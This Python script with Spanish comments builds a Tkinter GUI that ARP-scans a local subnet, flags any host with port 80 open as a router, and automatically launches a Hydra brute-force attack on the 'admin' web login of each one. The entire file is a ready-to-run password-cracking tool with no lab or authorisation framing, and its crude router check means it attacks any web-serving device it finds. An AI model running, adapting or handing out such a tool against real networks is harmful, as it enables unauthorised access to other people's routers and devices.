import os
import scapy.all as scapy
import subprocess
import socket
import tkinter as tk
from tkinter import messagebox
from threading import Thread

# Función para realizar escaneo de la red
def scan_network(network):
    # Enviar solicitud ARP para descubrir dispositivos en la red
    arp_request_broadcast = scapy.ARP(pdst=network)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request_broadcast
    answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    devices = []
    for element in answered:
        devices.append({"ip": element[1].psrc, "mac": element[1].hwsrc})
    
    return devices

# Función para realizar el ataque de fuerza bruta en el router
def brute_force_router(router_ip):
    try:
        # Comando para realizar ataque de fuerza bruta con Hydra
        # Este ejemplo asume que el router tiene una interfaz web HTTP en el puerto 80
        # Cambia el nombre de usuario y la lista de contraseñas según corresponda.
        cmd = f"hydra -l admin -P /ruta/a/tu/diccionario.txt http-get://{router_ip}"
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = result.stdout.decode()
        
        if "login:" in output:  # Hydra devuelve "login:" si la contraseña fue encontrada
            messagebox.showinfo("Resultado del ataque", f"¡Contraseña encontrada para el router {router_ip}!")
        else:
            messagebox.showinfo("Resultado del ataque", f"No se encontró la contraseña para el router {router_ip}.")
    
    except Exception as e:
        messagebox.showerror("Error", f"Ocurrió un error durante el ataque de fuerza bruta: {e}")

# Función para verificar si es un router
def is_router(ip):
    try:
        # Intentar conectarse al puerto 80 (HTTP) del router
        socket.setdefaulttimeout(1)
        s = socket.socket()
        result = s.connect_ex((ip, 80))  # Verifica si el puerto 80 está abierto
        if result == 0:
            return True
        else:
            return False
    except Exception as e:
        return False

# Función principal para escanear y mostrar resultados
def scan_and_display():
    network = "192.168.1.0/24"  # Cambia la red según tu configuración
    devices = scan_network(network)
    
    # Mostramos la lista de dispositivos
    device_list.delete(1.0, tk.END)
    for device in devices:
        device_list.insert(tk.END, f"IP: {device['ip']} | MAC: {device['mac']}\n")
        
        # Si se detecta un router, intentamos realizar un ataque de fuerza bruta
        if is_router(device['ip']):
            device_list.insert(tk.END, f"¡Router detectado en {device['ip']}! Iniciando ataque de fuerza bruta...\n")
            # Iniciar el ataque en un hilo separado para no bloquear la interfaz gráfica
            Thread(target=brute_force_router, args=(device['ip'],)).start()

# Crear la interfaz gráfica con Tkinter
root = tk.Tk()
root.title("Escaneo de red y ataque de fuerza bruta a routers")
root.geometry("500x400")

frame = tk.Frame(root)
frame.pack(pady=10)

scan_button = tk.Button(frame, text="Escanear Red", command=scan_and_display)
scan_button.grid(row=0, column=0, padx=10)

device_list = tk.Text(root, height=15, width=60)
device_list.pack(pady=10)

root.mainloop()
